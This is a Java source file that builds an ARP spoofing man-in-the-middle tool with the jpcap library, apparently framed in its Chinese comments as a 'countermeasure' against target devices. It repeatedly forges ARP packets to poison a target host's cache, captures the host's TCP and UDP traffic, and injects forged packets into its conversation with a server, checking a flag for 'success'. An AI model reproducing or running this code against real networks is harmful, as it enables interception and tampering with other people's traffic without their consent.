package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;





import javax.crypto.Mac;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;
import Factory.ARPFactory;
import Manager.Listenner.PackageListenner;
import Manager.Listenner.basicListenner;
import Manager.Strategy.PushUpdata;
import Model.DB_csv_device;
import Model.TestPacketReceiver;

public class Manager_cheatServiceAndHost_5 {
	
	
	//发送队列
	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	
	//接收抓取的上行数据包，每次抓取到都会更改
	//CopyOnWriteArrayList<Packet> pakage_up = new CopyOnWriteArrayList<Packet>();
	Packet pakage_up = null;
	//接收抓取的上行数据包，每次抓取到都会更改
	//CopyOnWriteArrayList<Packet> pakage_down = new CopyOnWriteArrayList<Packet>();
	Packet pakage_down = null;
	
	//多线程阻塞工具类
	final  CyclicBarrier cb = new CyclicBarrier(2);
	final  CyclicBarrier cb1 = new CyclicBarrier(2);
	
	//所有的监听者
	List<PackageListenner> listenners = new ArrayList<PackageListenner>();
	
	//推送者pushUpdata
	PushUpdata pushUpdata = null;
	
	
	//反制成功标志位flag
	private int craResultFlag ;
	//多线启动停止程控制标志
	volatile private boolean stopFlag = true;
	
	
	//配置文件
	static int ARP_INTERVAL;
	//static int NETCARD_INDEX;
	
	//static String HOST_IP;
	//static String SERVICE_IP;
	//static String ROUTE_IP;
	
	static String YOUR_DEVICE_MAC;
	//static String TARGET_HOST_MAC;
	//static String TARGET_ROUTE_MAC;
	
	
	//初始化数据读取
	//static String[] LISTENNER_DEVICES; 
	
	{
		readProperties();
		
	}
	
	
	
	/*************************************************
	 * 主函数，测试使用
	 *************************************************/	
	/*public static void main(String[] args) {
		
		Manager_cheatServiceAndHost_5 mc= new Manager_cheatServiceAndHost_5();
		
		//JpcapSender js = getCrad(NETCARD_INDEX,null);
		JpcapSender js = getCradByMAC(YOUR_DEVICE_MAC);
		
		//获取发送数据包的网卡
		
		*//*************************************************
		 * 从抓取的数据包获得反制数据队列
		 *************************************************//*
		mc.loadListenner();
		
		*//*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************//*                                                       
		mc.setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		*//************************************************* 
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************//*
		mc.sentThread(js);
		
		*//*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************//*
		//mc.capPacket_run(NETCARD_INDEX,HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		mc.capPacket_runByMAC(HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		*//*************************************************
		 * 加载listener和push推送者
		 *************************************************//*
		mc.loadPusher(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC,HOST_IP);
		
		
		*//*************************************************
		 * 启动监听反制标志位
		 *************************************************//*
		mc.abservationFlag();
		
	}*/
	
	
	/*************************************************
	 * 启动函数,为其他类调用时提供接口
	 *************************************************/
	public void start(String host_IP, String router_IP,String service_IP,String Host_MAC,String router_MAC,DB_csv_device dbModel){
		
		//获取发送数据包的网卡
		JpcapSender js = getCradByMAC(YOUR_DEVICE_MAC);
		
		//获取发送数据包的网卡
		
		/*************************************************
		 * 从抓取的数据包获得反制数据队列
		 *************************************************/
		
		loadListenner(Host_MAC,dbModel);
		
		/*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************/                                                       
		setARPs(host_IP,router_IP,YOUR_DEVICE_MAC,Host_MAC,null);
		
		
		/************************************************* 
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************/
	     sentThread(js);
		
		/*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************/
		capPacket_runByMAC(host_IP,service_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
		 * 模式一：只转发数据
		 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
		 *************************************************/
		loadPusher(2,YOUR_DEVICE_MAC,Host_MAC,router_MAC,host_IP);
		
		/*************************************************
		 * 启动监听反制标志位
		 *************************************************/
		abservationFlag();
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 从抓取的数据包中识别出反制数据队列
	 *************************************************/
	private void loadListenner(String hostMAC,DB_csv_device dbmodel){
		
		final String Mac = hostMAC;
		final DB_csv_device db = dbmodel;
		Runnable run = new Runnable() {
			
			@Override
			public void run() {
				
				
				/*if(LISTENNER_DEVICES.length!=0 && !LISTENNER_DEVICES[0].equals("")){
					
					for(String device:LISTENNER_DEVICES){
						
						try {
							
							new  basicListenner();
							listenners.add((PackageListenner)( Class.forName(device).getConstructor(BlockingQueue.class).newInstance(sendQueue) ));
							
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
							
						
					}
					System.out.println("反制设备listener添加成功  共:"+listenners.size());
					
				}*/
				//使用简单模型
				listenners.add(new basicListenner(sendQueue,Mac,db));
				
				System.out.println("反制设备listener添加成功  共:"+listenners.size());
				
					try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e){
						e.printStackTrace();
					}
					
					
			}
		};
		
		System.out.println("开始创建反制队列");
		new Thread(run).start();
	}
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP,根据MAC地址
	 *************************************************/
	private  void capPacket_runByMAC(final String host_ip, final String service_ip ,final String yourMAC){
	    
		
			String macString = yourMAC.replaceAll(":","");
			
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList(); 
	     NetworkInterface nc = null;
	     for(int i=0;i<devices.length;i++){
	    	 
	    	 if(bytesToHexString(devices[i].mac_address).equals(macString)){
	    		 nc = devices[i];
	    		 break;
	    	 }
	    	 
	     }
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("启动抓包线程");
					//是否每一次需要不同的Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(stopFlag){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("准备获取"+macString+"上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP
	 *************************************************/
	public  void capPacket_run(int i,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					
					try {
						  //等待pusher创建
						cb1.await();
					} catch (InterruptedException | BrokenBarrierException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
					System.out.println("启动抓包线程");
					//是否每一次需要不同的Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(stopFlag){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("准备获取第"+i+"个卡口上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	    //将Captor放到独立线程中运行    
	private  void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip,TestPacketReceiver pr){    
	       //JpcapCaptor jp=jpcap;    
    	  // while(true){}    
  		 //使用接包处理器循环抓包-1表示无限制的抓取数据包   "192.168.8.101","119.29.42.117"
  		  jpcap.loopPacket(1, pr);
  		  
  		  if(pr.getPacket() != null){

  			  Packet packet = pr.getPacket();
  			  
  			  
  			  //TCP帧 
  			  if(packet instanceof jpcap.packet.TCPPacket){
  				  TCPPacket tcpPacket = (TCPPacket)packet;
  				  
  				  if(tcpPacket.syn){
  					  
  					  System.out.println("握手帧......不处理");
  					  	
  				  }
  				//上行数据
  				  else if(host_ip.equals(tcpPacket.src_ip.getHostAddress())){
  					  
  					  pakage_up = pushUpdata.pushAfterDeal(pakage_up, tcpPacket);
  				  }
  				//下行行数据
  				  else if(host_ip.equals(tcpPacket.dst_ip.getHostAddress())){
  					 
  					pakage_up = pushUpdata.pushAfterDeal(pakage_down, tcpPacket);
  				  }
  				  
  				
  			  }	  
  			  
  			 //udp数据包不用提前处理
  			  else if(packet instanceof UDPPacket){
  				  UDPPacket udpPacket = (UDPPacket)packet;
  				  
  				  //上行数据
  				  if(host_ip.equals(udpPacket.src_ip.getHostAddress())){
  					  
  					  pushUpdata.pushAfterDeal(null, udpPacket);
  				  }
  				  //下行数据
  				  else if(host_ip.equals(udpPacket.dst_ip.getHostAddress())) {
  					
  					pushUpdata.pushAfterDeal(null, udpPacket);
  				  }
  				  
  				  
  			  }
  			  
  		  }  
  	   
       
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	 /*************************************************
	 * 发包线程
	 *************************************************/
	private void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						//不停的发包
						while(stopFlag){
							if(js != null){
									
								Packet packet = sendQueue.take();
								if(packet instanceof jpcap.packet.ARPPacket){
									
									System.out.println("sending arp.."); 
									
								}
								if(packet instanceof jpcap.packet.TCPPacket){
									
									TCPPacket tcpPacket = (TCPPacket)packet;
									System.out.println("sending TCPtohost.."+"seq|"+tcpPacket.sequence+
														" ack|"+tcpPacket.ack_num);
								}
								if(packet instanceof jpcap.packet.UDPPacket){
									
									UDPPacket udp = (UDPPacket) packet;
									System.out.println("sending UDP...."+"  lenth:"+udp.data.length);
								}
								
								js.sendPacket(packet);
							}
							
						}
					} catch (Exception e) {
						System.out.println("发送数据线程出错");
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			//new Thread(runner).start();
		   System.out.println("发包线程启动");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs设置
	 *************************************************/
	private  void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		  
		   ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				Set<ARPPacket> ARPs = null;
				Iterator<ARPPacket> it = null;
				
				//需要一个标志位来控制停止
				while(stopFlag){
					ARPs = arpFactory1.getInstance();
					it = ARPs.iterator();
					//把arp加入发送队列
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//每生产一次停止指定的时间ARP_INTERVAL
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  /*************************************************
	 * 伪造数据包线程,分为多种模式
	 *************************************************/
	private  void loadPusher(int flags,final String  yourMAC,final String hostMAC,final String rounteMAC,final String host_ip){
		   
		   //模式一为直接转发接收到的数据

		   //模式2为拦截对方数据,转发自己伪造的数据
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("进入到伪造线程1");
					  // int step = 0;
					   try {
							  //等待读取配置文件中的listeners
							cb.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   pushUpdata = new PushUpdata(yourMAC, hostMAC, rounteMAC, host_ip);
					   
					   if(listenners.size()!=0){
						   for(PackageListenner listenner : listenners){
							   pushUpdata.addListenner(listenner);
						   }
					   }
					   
					   try {
							  //阻塞抓包线程，只有在pusher准备完成之后，抓取数据包才能进行
							cb1.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	   * end
	   *************************************************/
	  
	  /*************************************************
	   * 用来检查反制成功的线程
	   *************************************************/
	  public void abservationFlag(){
		  
		  java.lang.Runnable  run =  new Runnable() {
			public void run() {
				while(true){
					if(pushUpdata!=null){
						if(pushUpdata.getListenners().size()!=0){
							int i = pushUpdata.cheakFlag();
							if(i ==2){
								 craResultFlag = i; 
								System.out.println("目标设备反制成功  flag:"+craResultFlag);
								break;
							}
							
						}
						
					}
					
				}
			}
		};
		  
		new Thread(run).start();
	  }
	  /*************************************************
	 * end
	 *************************************************/
	  
	  /*************************************************
	 * 提供了一个关闭反制线程的功能
	 *************************************************/
	  public void counterOver(){
		  
		  if(this.stopFlag=true){
			  
			  this.stopFlag =false;
		  }
		  
	  }
	  
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  
	  
	   /*************************************************
	   * 获取用来发送数据的网卡
	   *************************************************/
	  public static JpcapSender getCrad(int deviceNum,String NetCard_MAC){
				  
					NetworkInterface[] devices = null;
					 try{    
						 //获取本机上的网络接口对象数组    
						  devices = JpcapCaptor.getDeviceList();
System.out.println("网卡获取成功  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
System.out.println("显示网络接口数据失败:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
System.out.println("已获取网卡(发送使用)  "+deviceNum+"  JSender建立成功");  				
					} catch (IOException e1) {
System.out.println("JSender建立不成功");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		/*************************************************
		 * 字节数组转换
		 *************************************************/
	  private static String  bytesToHexString(byte[] src){  
		    StringBuilder stringBuilder = new StringBuilder("");  
		    if (src == null || src.length <= 0) {  
		        return null;  
		    }  
		    for (int i = 0; i < src.length; i++) {  
		        int v = src[i] & 0xFF;  
		        String hv = Integer.toHexString(v);  
		        if (hv.length() < 2) {  
		            stringBuilder.append(0);  
		        }  
		        stringBuilder.append(hv);  
		    }  
		    return stringBuilder.toString();  
		} 
		
		
		/*************************************************
		 * end
		 *************************************************/
		
		
		/*************************************************
		   * 获取用来发送数据的网卡------根据MAC地址
		   *************************************************/
	  private static JpcapSender getCradByMAC(String mac){
					  
				String macString = mac.replaceAll(":","");
				
						NetworkInterface[] devices = null;
						 try{    
							 //获取本机上的网络接口对象数组    
							  devices = JpcapCaptor.getDeviceList();
	System.out.println("网卡获取成功  ");  
							 }catch(Exception ef){    
							            ef.printStackTrace();    
	System.out.println("显示网络接口数据失败:  "+ef);    
							    }  
						JpcapSender js = null;
						
						for(int i = 0 ;i<devices.length;i++){
							if(bytesToHexString(devices[i].mac_address).equals(macString)){
								
								try {
									js = JpcapSender.openDevice(devices[i]);
			System.out.println("已获取网卡(发送使用)  "+i+"   mac:"+ macString+"  JSender建立成功");  				
								} catch (IOException e1) {
			System.out.println("JSender建立不成功");
									e1.printStackTrace();
								}
								break;
							}
						}
					  return js;
				  } 
				  /*************************************************
				 * end
				 *************************************************/
		
		
		
		
		/*************************************************
		 * 读取配置文件prameter.properties
		 *************************************************/
	  private void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/counterProperties.properties" );    
		        try  {    
		           prop.load(in);    
		 
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim()); 
		           /*NETCARD_INDEX = Integer.parseInt(prop.getProperty( "NETCARD_INDEX" ).trim());
		           HOST_IP = prop.getProperty( "HOST_IP" ).trim();
		           if(!prop.getProperty( "SERVICE_IP" ).trim().equals("")){
		        	   SERVICE_IP = prop.getProperty( "SERVICE_IP" ).trim();  
		           }else {
		        	   SERVICE_IP = null;
		           }*/
		           
		           //ROUTE_IP = prop.getProperty( "ROUTE_IP" ).trim();
		           YOUR_DEVICE_MAC = prop.getProperty( "YOUR_DEVICE_MAC" ).trim();
		           //TARGET_HOST_MAC = prop.getProperty( "TARGET_HOST_MAC" ).trim();
		           //TARGET_ROUTE_MAC = prop.getProperty( "TARGET_ROUTE_MAC" ).trim();
		           //LISTENNER_DEVICES =  prop.getProperty( "LISTENNER_DEVICES" ).trim().split(",");
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		     
		  }
		  /*************************************************
		 * end
		 *************************************************/


		public int getCraResultFlag() {
			return craResultFlag;
		}


		public void setCraResultFlag(int craResultFlag) {
			this.craResultFlag = craResultFlag;
		}
}    